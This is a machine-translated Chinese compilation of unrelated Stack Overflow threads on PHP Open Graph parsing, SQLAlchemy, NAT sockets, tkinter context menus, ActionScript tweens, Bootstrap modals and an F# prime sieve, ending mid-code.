
* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-03-01T10:42:47.910

按照这种方法，您将获得 fabcebook 开放图形标签的密钥对数组。

```
 $url="http://fbcpictures.in";
 $site_html=  file_get_contents($url);
    $matches=null;
    preg_match_all('~<\s*meta\s+property="(og:[^"]+)"\s+content="([^"]*)~i',     $site_html,$matches);
    $ogtags=array();
    for($i=0;$i<count($matches[1]);$i++)
    {
        $ogtags[$matches[1][$i]]=$matches[2][$i];
    } 
```

![facebook 开放图标签的输出](../Images/11596d47f79692831369d4152872fbc1.png)

# python - SQLAlchemy 可以使用 PostgreSQL 的“from only”子句吗？

> ID：12014200
> 
> 赞同：8
> 
> 时间：2012-08-17T23:02:38.450
> 
> 标签：python, sql, postgresql, sqlalchemy

我需要在选择查询中使用 PostgreSQL **only子句。**我可以用 SQLAlchemy 做到这一点吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T23:47:58.630

是的，只要您使用 SQLAlchemy 版本 0.8.0 或更新的版本（参见[issue 2506](http://www.sqlalchemy.org/trac/ticket/2506)）。

关键字被`ONLY`实现为选择提示：

```
result = table.select().with_hint(table, 'ONLY', 'postgresql') 
```

或者在使用 ORM 层时，在查询对象上使用：

```
session.query(...).with_hint(MappedClass, 'ONLY', 'postgresql') 
```

# python - 如何使用位于不同 NAT 上的套接字在 2 个 Python 程序之间进行通信？

> ID：12014203
> 
> 赞同：6
> 
> 时间：2012-08-17T23:03:05.907
> 
> 标签：python, sockets, nat

我想使用套接字在两个 Python 程序之间发送和接收消息。当计算机连接到同一个路由器时，我可以使用私有 IP 来执行此操作，但是当有 2 个 NAT 将它们分开时我该怎么做？

谢谢*（我的第一个问题）*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:33:47.410

如果没有公共可寻址 IP 地址上的中继服务器，您通常无法做到这一点。有所谓的“穿通”技术，在某些情况下，可以让您在使用公共服务器找出端口映射后切换到直接连接——[本文](http://www.raknet.net/raknet/manual/natpunchthrough.html)描述了 RakNet 游戏网络库是如何做到的——但即使这些往往挑剔和不可靠。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T17:00:12.893

Zeromq，是要走的路。它非常快速且非常容易。[http://www.zeromq.org/](http://www.zeromq.org/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T17:22:44.980

Redis，可以工作，但功能不完全相同。

# database - 为基于条件的信息设计数据库表的最佳方法是什么

> ID：12014204
> 
> 赞同：0
> 
> 时间：2012-08-17T23:03:25.183
> 
> 标签：database, database-design

我需要开发一个简单的数据库应用程序。用于存储回答以下问题的患者社会历史的表格，

你抽烟吗？**如果是，每天抽多少支烟？*****__多少年？_** **你喝酒吗？*****__**如果是，每周有多少酒精饮料？***_*** 你吸毒吗？***_****如果是，是什么类型的？*****_ __ *_****多久一次？*****_ *_* ___** 等。我可以为每个答案设置表格列。由于有 if then else 条件，我想知道，为这种类型的场景设计表格的最佳方法是什么。**********

 ******非常感谢任何形式的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:21:27.810

您在这里要做的就是尝试概括您提出的问题类型。对我来说最突出的是你在问关于*习惯*的问题，或者是一种重复的行为。

抽象出你的问题：它是什么样的习惯（吸烟？喝酒？药物1，药物2，药物3）？你多久放纵一下这个习惯？你每天、每周、每月、每年都做吗？如果你每天都做，一天做几次？每周/每月/每年多少次？

这意味着您可以有一个描述通用“习惯”的表格，其中每一行代表患者对特定习惯的回答，每列代表患者已回答的特定数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:06:53.890

如果您坚持使用“survey_responses”或类似的平排而不是元设置，那么只需将后续问题设为 NULL。你的应用程序应该处理验证等。******

# bots - 一种将 IRC chatter/pm 转移到 gtalk 的方法

> ID：12014208
> 
> 赞同：0
> 
> 时间：2012-08-17T23:03:53.983
> 
> 标签：bots, irc, google-talk

我想知道是否存在某种机器人/工具/服务可以让人们在（定期）IRC 上与我在 gtalk 上聊天

所以：irc 用户 X 向 MyBot (fe) 发送了一个 pm；那个下午转发给我

一个 irc 聊天室也可以正常工作（所以频道#abc 中所说的所有内容都会进入我与 mybot@domain.com 的 gtalk 对话

希望我足够清楚，让您了解我在寻找什么，并且任何人都知道我解决它的方法。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T04:32:58.933

嗯，有[hans-irc-gtalk 机器人](http://code.google.com/p/hans-irc-gtalk/)可以做类似的事情。人们需要订阅这些消息才能从 gtalk 中获取它们。不确定该项目的支持程度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T04:46:01.203

您可以使用[PircBotX](http://code.google.com/p/pircbotx/)在 Java 中自己创建一个 IRC 机器人，并使用 pm events 使用任何旧的 Jabber 库发送 gtalk 消息。快速搜索找到我[Smack](http://www.igniterealtime.org/projects/smack/index.jsp)。

我曾经做过类似的事情，但我创建了两个 PircBotX 实例，一个连接到 IRC 服务器，另一个连接到这个特殊的 IRC 服务器，该服务器配置为自动将消息传递给流行的 IM 协议。我似乎不记得那个服务叫什么了，也许你会有更好的运气。

# python - tkinter 应用程序添加右键单击上下文菜单？

> ID：12014210
> 
> 赞同：28
> 
> 时间：2012-08-17T23:04:16.730
> 
> 标签：python, user-interface, tkinter, contextmenu

我有一个 python-tkinter gui 应用程序，我一直在尝试找到某种方法来添加一些功能。我希望有一种方法可以右键单击应用程序列表框区域中的项目并调出上下文菜单。tkinter 能够做到这一点吗？我会更好地研究 gtk 或其他一些 gui-toolkit 吗？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2012-08-17T23:29:34.333

您将创建一个[Menu](https://web.archive.org/web/20190524140835/http://infohost.nmt.edu/tcc/help/pubs/tkinter/web/menu.html)实例并编写一个调用
其[`post()`](http://effbot.org/tkinterbook/menu.htm)or[`tk_popup()`](https://www.tcl.tk/man/tcl8.7/TkCmd/popup.htm)方法的函数。

tkinter[文档](https://docs.python.org/3/library/tkinter.html)目前没有任何关于`tk_popup()`.
阅读[Tk 文档](https://www.tcl.tk/man/tcl8.7/TkCmd/contents.htm)以获取描述或来源：

[`library/menu.tcl`在 Tcl/Tk 源代码中](http://core.tcl.tk/tk/artifact/6b33a1452c19b104)：

```
::tk_popup --
此过程弹出一个菜单并设置遍历
菜单及其子菜单。

论据：
menu - 要弹出的菜单的名称。
x, y - 弹出菜单的根坐标。  
entry - 以 (x,y) 为中心的菜单项的索引。  
        如果省略或指定为 {}，则菜单的  
        左上角在 (x,y) 处。  

```

[`tkinter/__init__.py`在 Python 源代码中](https://github.com/python/cpython/blob/master/Lib/tkinter/__init__.py)：

```
def tk_popup(self, x, y, entry=""):
    """Post the menu at position X,Y with entry ENTRY."""
    self.tk.call('tk_popup', self._w, x, y, entry) 
```

您将上下文菜单调用函数与右键单击相关联：
[`the_widget_clicked_on.bind("<Button-3>", your_function)`](https://web.archive.org/web/20190524140835/http://infohost.nmt.edu/tcc/help/pubs/tkinter/web/binding-levels.html)。

但是，与右键单击相关的数字在每个平台上都不相同。

[`library/tk.tcl`在 Tcl/Tk 源代码中](http://core.tcl.tk/tk/artifact/4ff6154cc3cca965)：

```
在 Darwin/Aqua 上，从左到右的按钮是 1,3,2。  
在以最近的 XQuartz 作为 X 服务器的 Darwin/X11 上，它们是 1、2、3；
其他 X 服务器可能会有所不同。

```

这是我编写的一个示例，它向列表框添加了上下文菜单：

```
import tkinter # Tkinter -> tkinter in Python 3

class FancyListbox(tkinter.Listbox):

    def __init__(self, parent, *args, **kwargs):
        tkinter.Listbox.__init__(self, parent, *args, **kwargs)

        self.popup_menu = tkinter.Menu(self, tearoff=0)
        self.popup_menu.add_command(label="Delete",
                                    command=self.delete_selected)
        self.popup_menu.add_command(label="Select All",
                                    command=self.select_all)

        self.bind("<Button-3>", self.popup) # Button-2 on Aqua

    def popup(self, event):
        try:
            self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
        finally:
            self.popup_menu.grab_release()

    def delete_selected(self):
        for i in self.curselection()[::-1]:
            self.delete(i)

    def select_all(self):
        self.selection_set(0, 'end')

root = tkinter.Tk()
flb = FancyListbox(root, selectmode='multiple')
for n in range(10):
    flb.insert('end', n)
flb.pack()
root.mainloop() 
```

The use of `grab_release()` was observed in [an example on effbot](http://effbot.org/zone/tkinter-popup-menu.htm).
Its effect might not be the same on all systems.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-01-20T10:50:08.070

I made some changes to the conext menu code above in order to adjust my demand and I think it would be useful to share:

**Version 1:**

```
import tkinter as tk
from tkinter import ttk

class Main(tk.Frame):
    def __init__(self, master):
        tk.Frame.__init__(self, master)
        master.geometry('500x350')
        self.master = master
        self.tree = ttk.Treeview(self.master, height=15)
        self.tree.pack(fill='x')
        self.btn = tk.Button(master, text='click', command=self.clickbtn)
        self.btn.pack()
        self.aMenu = tk.Menu(master, tearoff=0)
        self.aMenu.add_command(label='Delete', command=self.delete)
        self.aMenu.add_command(label='Say Hello', command=self.hello)
        self.num = 0

        # attach popup to treeview widget
        self.tree.bind("<Button-3>", self.popup)

    def clickbtn(self):
        text = 'Hello ' + str(self.num)
        self.tree.insert('', 'end', text=text)
        self.num += 1

    def delete(self):
        print(self.tree.focus())
        if self.iid:
            self.tree.delete(self.iid)

    def hello(self):
        print ('hello!')

    def popup(self, event):
        self.iid = self.tree.identify_row(event.y)
        if self.iid:
            # mouse pointer over item
            self.tree.selection_set(self.iid)
            self.aMenu.post(event.x_root, event.y_root)            
        else:
            pass

root = tk.Tk()
app=Main(root)
root.mainloop() 
```

**Version 2:**

```
import tkinter as tk
from tkinter import ttk

class Main(tk.Frame):
    def __init__(self, master):
        master.geometry('500x350')
        self.master = master
        tk.Frame.__init__(self, master)
        self.tree = ttk.Treeview(self.master, height=15)
        self.tree.pack(fill='x')
        self.btn = tk.Button(master, text='click', command=self.clickbtn)
        self.btn.pack()
        self.rclick = RightClick(self.master)
        self.num = 0

        # attach popup to treeview widget
        self.tree.bind('<Button-3>', self.rclick.popup)
    def clickbtn(self):
        text = 'Hello ' + str(self.num)
        self.tree.insert('', 'end', text=text)
        self.num += 1

class RightClick:
    def __init__(self, master):

        # create a popup menu
        self.aMenu = tk.Menu(master, tearoff=0)
        self.aMenu.add_command(label='Delete', command=self.delete)
        self.aMenu.add_command(label='Say Hello', command=self.hello)

        self.tree_item = ''

    def delete(self):
        if self.tree_item:
            app.tree.delete(self.tree_item)

    def hello(self):
        print ('hello!')

    def popup(self, event):
        self.aMenu.post(event.x_root, event.y_root)
        self.tree_item = app.tree.focus()

root = tk.Tk()
app=Main(root)
root.mainloop() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-06-05T08:27:08.047

```
from tkinter import *
root=Tk()
root.geometry("500x400+200+100")

class Menu_Entry(Entry):
    def __init__(self,perant,*args,**kwargs):
        Entry.__init__(self,perant,*args,**kwargs)
        self.popup_menu=Menu(self,tearoff=0,background='#1c1b1a',fg='white',
                                     activebackground='#534c5c',
                             activeforeground='Yellow')
        self.popup_menu.add_command(label="Cut                     ",command=self.Cut,
                                    accelerator='Ctrl+V')
        self.popup_menu.add_command(label="Copy                    ",command=self.Copy,compound=LEFT,
                                    accelerator='Ctrl+C')

        self.popup_menu.add_command(label="Paste                   ",command=self.Paste,accelerator='Ctrl+V')
        self.popup_menu.add_separator()
        self.popup_menu.add_command(label="Select all",command=self.select_all,accelerator="Ctrl+A")
        self.popup_menu.add_command(label="Delete",command=self.delete_only,accelerator=" Delete")
        self.popup_menu.add_command(label="Delete all",command=self.delete_selected,accelerator="Ctrl+D")
        self.bind('<Button-3>',self.popup)
        self.bind("<Control-d>",self.delete_selected_with_e1)
        self.bind('<App>',self.popup)
        self.context_menu = Menu(self, tearoff=0)
        self.context_menu.add_command(label="Cut")
        self.context_menu.add_command(label="Copy")
        self.context_menu.add_command(label="Paste")

    def popup(self, event):
      try:
        self.popup_menu.tk_popup(event.x_root, event.y_root, 0)
      finally:
        self.popup_menu.grab_release()

    def Copy(self):
      self.event_generate('<<Copy>>')

    def Paste(self):
      self.event_generate('<<Paste>>')

    def Cut(self):
      self.event_generate('<<Cut>>')

    def delete_selected_with_e1(self,event):
      self.select_range(0, END)
      self.focus()
      self.event_generate("<Delete>")

    def delete_selected(self):
      self.select_range(0, END)
      self.focus()
      self.event_generate("<Delete>")

    def delete_only(self):
      self.event_generate("<BackSpace>")

    def select_all(self):
      self.select_range(0, END)
      self.focus()

ent=Menu_Entry(root)
ent.pack()

root.mainloop() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-11-09T17:43:17.463

Important Caveat:

(Assuming the event argument that contains the coordinates is called "event"): Nothing will happen or be visible when you call tk_popup(...) unless you use "event.x_root" and "event.y_root" as arguments. If you do the obvious of using "event.x" and "event.y", it won't work, even though the names of the coordinates are "x" and "y" and there is no mention of "x_root" and "y_root" anywhere within it.

As for the grab_release(..), it's not necessary, anywhere. "tearoff=0" also isn't necessary, setting it to 1 (which is default), simply adds a dotted line entry to the context menu. If you click on it, it detaches the context menu and makes it its own top-level window with window decorators. tearoff=0 will hide this entry. Moreover, it doesn't matter if you set the menu's master to any specific widget or root, or anything at all.

# php - foreach 切换循环

> ID：12014213
> 
> 赞同：2
> 
> 时间：2012-08-17T23:05:02.207
> 
> 标签：php, foreach

我很困惑为什么会发生这个错误，如果有人可以帮忙

```
foreach ( $filters as $_filter )
{  
    switch ($_filter[1])
    {   
        case "/FlateDecode" :
            if (function_exists("gzuncompress") )
            {   echo 'testing1';
                $xrefStreamData = 0 < strlen( $xrefStreamData ) ? gzuncompress( @$xrefStreamData ) : "";
            }
            else
            {
                $this->error( sprintf( "To handle %s filter, please compile php with zlib support.", $_filter[1] ) );
            }
            if ( $xrefStreamData === false )
            {  echo 'testing2';
                $this->error( "Error while decompressing stream." );
            }
            break;

        case "/LZWDecode" :
                echo 'testing3';
            include_once( "filters/FilterLZW_FPDI.php" );
                 //does not go through
            $decoder = new FilterLZW_FPDI( $this->fpdi );
            $xrefStreamData = $decoder->decode( $xrefStreamData );
            break;
        case "/ASCII85Decode" :
            echo 'testing4';
            include_once( "filters/FilterASCII85_FPDI.php" );
            $decoder = new FilterASCII85_FPDI( $this->fpdi );
            $xrefStreamData = $decoder->decode( $xrefStreamData );
            break;
        case null :
            break;
    }
    $this->error( "Unsupported Filter: %s", $_filter[1] );
} 
```

我将回声设置为调试以查看它通过哪些循环，我得到的输出是 testing1 unsupported Filter %s

这是否意味着数组`$_filter`为空？如果它为空，为什么它首先进入 foreach 循环？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:09:25.560

你的代码很好。该行：

```
$this->error( "Unsupported Filter: %s", $_filter[1] ); 
```

毕竟是 case 语句中的所有条件检查，因此总是会打印出来！

你应该做的是，把它放在一个像这样的默认子句下：

```
...
case null :
     break;

default:
     $this->error( "Unsupported Filter: %s", $_filter[1] );
     break; 
```

顺便说一句，我不知道 null: 是什么情况，但我实际上会用默认值替换它。

# actionscript-3 - Doobers 扑通扑通——如何处理补间？附上测试用例+截图

> ID：12014217
> 
> 赞同：1
> 
> 时间：2012-08-17T23:05:24.473
> 
> 标签：actionscript-3, apache-flex, actionscript, tween, gsap

大多数社交游戏（如 CastleVille (c) Zynga 或 Magic Land (c) Wooga）都有*硬币*、星星等奖励给玩家一些简单的动作，比如砍树。

doobers 似乎执行了几个补间：

1.  首先，他们扑通一声跳了出来。它们的尺寸也会反弹。
2.  之后，他们以贝塞尔曲线飞到得分栏。

我为我的问题准备了一个非常简单的测试用例和屏幕截图。测试用例在 Flex 中，因为这是我最近一直在使用的，但我的问题更笼统（ActionScript，Tween）。我正在使用[com.greensock.TweenMax](http://www.greensock.com/as/docs/tween/)库。

**我的问题：**我已经弄清楚如何做第二个贝塞尔部分。但我不知道，第一个弹跳部分怎么做？

![在此处输入图像描述](../Images/0d0ee905e32eb8daeadf8cb2287d9494.png)

**MyApp.mxml**（不一定是 Flex，可以是 Flash）：

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx" 
               applicationComplete="init()">

    <fx:Script>
        <![CDATA[
            import mx.collections.ArrayList;
            import spark.core.SpriteVisualElement;
            import com.greensock.TweenMax;
            import com.greensock.easing.Cubic;

            private function init():void {
                var g:Graphics = myComp.graphics;
                g.clear();
                g.beginFill(0xCCCCCC);
                g.drawRect(0, 0, myComp.width, myComp.height);
                g.endFill();                
            }           

            private function handleClick(event:MouseEvent):void {
                var star:SpriteVisualElement = new Star();
                star.x = event.localX;
                star.y = event.localY;
                myComp.addChild(star);

                TweenMax.to(star, 1, {
                    delay: 2,
                    ease:  Cubic.easeOut,
                    bezier: [
                        {x: myComp.width - star.width, y: Math.max(event.localY, myComp.height/2)}, 
                        {x: myComp.width - star.width, y: 0}
                    ]
                });
            }

        ]]>
    </fx:Script>    

    <mx:UIComponent id="myComp" width="100%" height="100%" click="handleClick(event)" />

</s:Application> 
```

**星.fxg：**

```
<?xml version='1.0' encoding='UTF-8'?>
<!-- fxg/star.fxg -->
<fxg:Graphic xmlns:fxg="http://ns.adobe.com/fxg/2008" version="2">    
    <fxg:Path x="9.399" y="10.049" data="M 82.016 78.257 L 51.895 69.533 L 27.617 89.351 L 26.621 58.058 L 0.231 41.132 L 29.749 30.52 L 37.714 0.241 L 56.944 24.978 L 88.261 23.181 L 70.631 49.083 Z">
        <fxg:fill>
            <fxg:SolidColor color="#FFFFFF"/>
        </fxg:fill>
        <fxg:stroke>
            <fxg:SolidColorStroke 
                caps="none" 
                color="#4769C4" 
                joints="miter" 
                miterLimit="4" 
                weight="20"/>
        </fxg:stroke>
    </fxg:Path>
</fxg:Graphic> 
```

另外我想知道，如何在最后添加“宝丽来相机闪光灯”效果？

**更新：**

在 LondonDrugs_MediaServices 的帮助下（谢谢！）doobers 现在挤压和跳跃（代码如下），但我仍然有 3 个未解决的问题：

1.  如何在鼠标悬停事件上运行 flyTween？
2.  如何在最后添加“宝丽来闪电战”补间？
3.  不知道如何在最后删除鼠标悬停处理程序 - 因为它是一个匿名闭包

[我还在GreenSock 论坛](http://forums.greensock.com/topic/6498-doobers-plopping-out-how-to-squeeze-and-bounce-at-the-same-time/)上发布了我的问题。

谢谢你的任何提示

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx" 
               applicationComplete="init()">

    <fx:Script>
        <![CDATA[
            import com.greensock.TweenMax;
            import com.greensock.easing.Bounce;
            import com.greensock.easing.Cubic;
            import spark.core.SpriteVisualElement;

            private function init():void {
                var g:Graphics = myComp.graphics;
                g.clear();
                g.beginFill(0xCCCCCC);
                g.drawRect(0, 0, myComp.width, myComp.height);
                g.endFill();                
            }           

            private function handleClick(event:MouseEvent):void {
                var star:SpriteVisualElement = new Star();
                star.x = event.localX;
                star.y = event.localY;
                myComp.addChild(star);

                TweenMax.to(star, 2, {
                    bezier: [
                        {x:star.x + 10, y:star.y - 20, scaleX: 1,   scaleY: 1}, 
                        {x:star.x + 20, y:star.y + 20, scaleX: 1.2, scaleY: .8}, 
                        {x:star.x + 20, y:star.y + 30, scaleX: 1,   scaleY: 1}], 
                    orientToBezier: false, 
                    ease: Bounce.easeOut
                });

                var flyTween:TweenMax = TweenMax.to(star, 1, {
                    delay: 10,
                    ease:  Cubic.easeOut,
                    bezier: [
                        {x: myComp.width - star.width, y: Math.max(event.localY, myComp.height/2)}, 
                        {x: myComp.width - star.width, y: 0}
                    ],
                    onComplete: function():void {
                        myComp.removeChild(star);
                        // XXX how to remove the mouse over handler here?
                    }
                });

                star.addEventListener(MouseEvent.MOUSE_OVER, function(event:MouseEvent):void {
                    // XXX how to force flyTween to execute right now, without the delay?
                    flyTween.complete();
                });
            }
        ]]>
    </fx:Script>    

    <mx:UIComponent id="myComp" width="100%" height="100%" click="handleClick(event)" />

</s:Application> 
```

UPDATE2：谢谢LondonDrugs_MediaServices，这里再次更新了截图+代码。

和 doobers 一起玩已经很有趣了，但是仍然有 2 个小问题：

1.  我真的必须杀死（延迟的）补间蝇吗？我不能在鼠标悬停时以某种方式修改它的延迟（将其设置为 0）吗？
2.  最后有那种“相机闪光”效果会很好。我只是不记得它是如何完成的——一些标准的 Flash MX 效果......

![在此处输入图像描述](../Images/13fb156133671c1b7115ca16a3efa2de.png)

**MyApp.mxml：**

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:mx="library://ns.adobe.com/flex/mx" 
               applicationComplete="init()">

    <fx:Script>
        <![CDATA[
            import com.greensock.TweenMax;
            import com.greensock.easing.Bounce;
            import com.greensock.easing.Cubic;
            import flash.filters.GlowFilter;
            import spark.core.SpriteVisualElement;

            private function init():void {
                var g:Graphics = myComp.graphics;
                g.clear();
                g.beginFill(0xCCCCCC);
                g.drawRect(0, 0, myComp.width, myComp.height);
                g.endFill();                
            }           

            private function goFlyTween(star:DisplayObject, delay:Number = 0):void {
                TweenMax.to(star, 1, {
                    delay: delay,
                    ease:  Cubic.easeOut,
                    bezier: [
                        {x: myComp.width - star.width, 
                         y: Math.max(star.y, myComp.height/2)}, 
                        {x: myComp.width - star.width, y: 0}
                    ],
                    onComplete: function():void {
                        if(star.parent)
                            star.parent.removeChild(star);
                    }
                });
            }

            private function handleClick(event:MouseEvent):void {
                var star:SpriteVisualElement = new Star();
                star.filters = [
                    new GlowFilter(0xffffff, 1, 4, 4, 10, 2), 
                    new GlowFilter(0x0, 1, 1.5, 1.5, 10, 2)
                ];
                star.x = event.localX;
                star.y = event.localY;
                myComp.addChild(star);

                TweenMax.to(star, 2, {
                    bezier: [
                        {x:star.x + 10, y:star.y - 20, scaleX: 1,   scaleY: 1}, 
                        {x:star.x + 20, y:star.y + 20, scaleX: 1.2, scaleY: .8}, 
                        {x:star.x + 20, y:star.y + 30, scaleX: 1,   scaleY: 1}], 
                    orientToBezier: false, 
                    ease: Bounce.easeOut,
                    onComplete: goFlyTween,
                    onCompleteParams: [star, 3]
                });

                star.addEventListener(MouseEvent.MOUSE_OVER, function(event:MouseEvent):void {
                    // instead of killing + recreating, can't we just reset the delay?
                    TweenMax.killTweensOf(star);
                    goFlyTween(star);
                }, false, 0, true);
            }
        ]]>
    </fx:Script>    

    <mx:UIComponent id="myComp" width="100%" height="100%" click="handleClick(event)" />

</s:Application> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:40:47.410

您可以按照与第二部分相同的基本方式进行操作。只需使用 Bounce 缓动函数，并为补间添加一些 scaleX 修改：（当然，您需要为您的场景相应地设置 x/y 值）

```
TweenMax.to(star, 3, {bezier:[{x:star.x + 20, y:star.y - 10, scaleX: 1}, {x:star.x + 40, y:star.y + 20, scaleX: 2}, {x:star.x + 40, y:star.y + 30, scaleX: 1}], orientToBezier:false, ease:Bounce.easeOut}); 
```

**编辑**

对于您编辑中的其他问题：

我建议为你的 flyTween 制作一个单独的函数，这不是必需的，但在我看来让生活更清洁。mouseOver 处理程序上的弱侦听器将使其成为非问题，请参阅下面代码中的更新。我不知道你所说的“宝丽来闪电战”是什么意思，所以你需要进一步解释。

```
 private function goFlyTween(star:DisplayObject, delay:Number = 0):void {
           TweenMax.to(star, 1, {
               delay: delay,
               ease:  Cubic.easeOut,
               bezier: [
                   {x: myComp.width - star.width, y: Math.max(event.localY, myComp.height/2)}, 
                   {x: myComp.width - star.width, y: 0}
               ],
               onComplete: function():void {
                    if(star.parent){
                        star.parent.removeChild(star);
               }
           });
       }

       private function handleClick(event:MouseEvent):void {
            var star:SpriteVisualElement = new Star();
            star.x = event.localX;
            star.y = event.localY;
            myComp.addChild(star);

            TweenMax.to(star, 2, {
                bezier: [
                    {x:star.x + 10, y:star.y - 20, scaleX: 1,   scaleY: 1}, 
                    {x:star.x + 20, y:star.y + 20, scaleX: 1.2, scaleY: .8}, 
                    {x:star.x + 20, y:star.y + 30, scaleX: 1,   scaleY: 1}], 
                orientToBezier: false, 
                ease: Bounce.easeOut,
                onComplete: goFlyTween,
                onCompleteParams: [star, 3]
            });

            star.addEventListener(MouseEvent.MOUSE_OVER,function(event:MouseEvent):void {
                TweenMax.killTweensOf(star);
                goFlyTween(star);
            },false,0,true); //use a weak listener (last parameter true on addEventListener), then you don't have to worry about removing the listener.  OR just don't use an anonymous function for this...
        } 
```

对于反弹补间，添加 onComplete 参数：

# jquery - 是否可以防止使用 jQuery 触发 HTML5 数据属性操作？

> ID：12014218
> 
> 赞同：2
> 
> 时间：2012-08-17T23:05:27.553
> 
> 标签：jquery, html, twitter-bootstrap

我问这个问题只是为了**学习目的**，因为我什至在写这篇文章之前就解决了这个问题，但也许你会指出一些对其他人有用的东西。

我正在使用[Twitter Bootstrap](http://twitter.github.com/bootstrap/)及其[模态库](http://twitter.github.com/bootstrap/javascript.html#modals)，这就是我的代码的作用。我们打开一个模态，要求用户输入一些 json，然后用户按下“计算按钮”来计算数据，然后模态关闭，因为`data-dismiss`.

我只想知道是否可以`data-dismiss`使用 jQuery、javascript 或其他东西来阻止由 html 属性触发的操作。

这是模态的 HMTL 代码：

```
<div class="modal hide fade" id="source_modal">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">×</button>
        <h3>Manually insert the data</h3>
    </div>
    <div class="modal-body">
        <textarea class="source_input">Insert your data here</textarea>
        <div class="clear"></div>
        <a href="#" class="btn action_clear">Clear</a>
    </div>
    <div class="modal-footer">
        <a href="#" class="btn" data-dismiss="modal">Close</a>
        <a class="btn btn-primary action_compute" data-dismiss="modal" href="#"><i class="icon-fire"></i> Compute</a>
    </div>
</div> 
```

注意最后一个按钮（计算按钮）有`data-dismiss="modal"`

所以基本上，锚的类`try catch`附加了一个函数。`action_compute`

请参阅此 jQuery 代码：

```
// compute graph with json input
  $('.action_compute').on('click', function(event) {
    try
    {
      var json = JSON.parse($('.source_input').val());
      create_graph(json);
    }
    catch(err)
    {
      txt="There was an with your json data.\n";
      txt+="Error description: " + err.message + "\n\n";
      txt+="you can try to validate it with JSONLint. You may also leave the textarea blank for default behaviour";
      alert(txt);
    }
  }); 
```

是否可以防止触发的动作`data-dismiss`？

笔记：

*   Twitter bootstrap 提供了一个 jquery 方法来关闭模态，所以我删除了`data-dismiss`，并且我`$('#upload_modal').modal('hide');`只在尝试结束时才使用关闭模态，这样它就可以完成我想要的操作。
*   当放置在 jQuery 代码的第一行时， jQuery`event.preventDefault();`不会停止关闭操作`catch(err)`；）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-18T00:10:59.510

尝试添加一个监听器来阻止该`hide`方法的执行。

```
$('.modal').one('hide', function (e) {e.preventDefault()});​​​​​​​​​​​​​​​ 
```

将其放在错误捕获部分中。只要在调用之前处理了 click 事件`hide()`，这应该可以工作。

### [JSFiddle](http://jsfiddle.net/mmfansler/fkUHe/)

* * *

由于您确实说过这个问题是出于学习目的，因此我将在此处添加一些有关 Bootstrap 插件事件架构的附加信息。

许多 Bootstrap 插件包括“之前”和“之后”事件。“之前”事件（在本例中为**hide** ）在相关方法的任何基本操作执行*之前*被触发并传播到 DOM 。当执行返回到最初触发的方法时，发生的第一件事是检查操作是否已被取消：

```
if (e.isDefaultPrevented()) return 
```

因此，任何调用的事件侦听器都`e.preventDefault()`将有效地取消该操作。简单，如您所料。

任何实现良好的触发事件的 jQuery 插件都应该具有此功能。

# java - pauseAWT() 和 sleepAWT() 有什么区别

> ID：12014222
> 
> 赞同：0
> 
> 时间：2012-08-17T23:05:54.233
> 
> 标签：java, awt

任何人都可以帮助我了解 pauseAWT() 和 awtSleep() 之间的区别吗？还有什么时候使用一个而不是另一个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T23:26:15.037

`junit.extensions.jfcunit.JFCTestCase`在 JUnit 的 AWT 测试中？我认为[Javadocs](http://jfcunit.sourceforge.net/api/junit/extensions/jfcunit/JFCTestCase.html#pauseAWT%28%29)很清楚：

*   **`pauseAWT`:**暂停 awt 事件队列，直到它被释放`releaseAWT()`或到达测试结束。
*   **`awtSleep`:** **w/o 参数：**暂停测试最长一段时间，并允许 AWT 线程临时恢复 / **w/ 参数：**暂停测试最长指定（最长）时间，并允许 AWT线程暂时恢复。

因此，第一个暂停 AWT 线程，第二个暂停测试并允许 AWT 线程恢复。请记住，AWT 在单独的线程中运行，通常称为 EDT（事件调度线程）。看起来您会同时使用这两种方法来确保测试的可复制状态。

# f# - 在 F# 中生成素数时，为什么“Erosthenes 筛”在这个特定的实现中如此缓慢？

> ID：12014224
> 
> 赞同：3
> 
> 时间：2012-08-17T23:06:02.423
> 
> 标签：f#

IE，

我在这里做错了什么？它是否与列表、序列和数组以及限制的工作方式有关？

所以这里是设置：我正在尝试生成一些素数。我看到有十亿个素数的十亿个文本文件。问题不在于为什么……问题是使用 python 的人如何在[这篇文章](https://stackoverflow.com/questions/2068372/fastest-way-to-list-all-primes-below-n-in-python)中以毫秒为单位计算所有低于 1,000,000 的素数……我在下面的 F# 代码中做错了什么？

```
let sieve_primes2 top_number = 
    let numbers = [ for i in 2 .. top_number do yield i ]
    let sieve (n:int list) = 
        match n with
        | [x] -> x,[]
        | hd :: tl -> hd, List.choose(fun x -> if x%hd = 0 then None else Some(x)) tl
        | _ -> failwith "Pernicious list error."
    let rec sieve_prime (p:int list) (n:int list) =  
        match (sieve n) with
        | i,[] -> i::p
        | i,n'  -> sieve_prime (i::p) n'
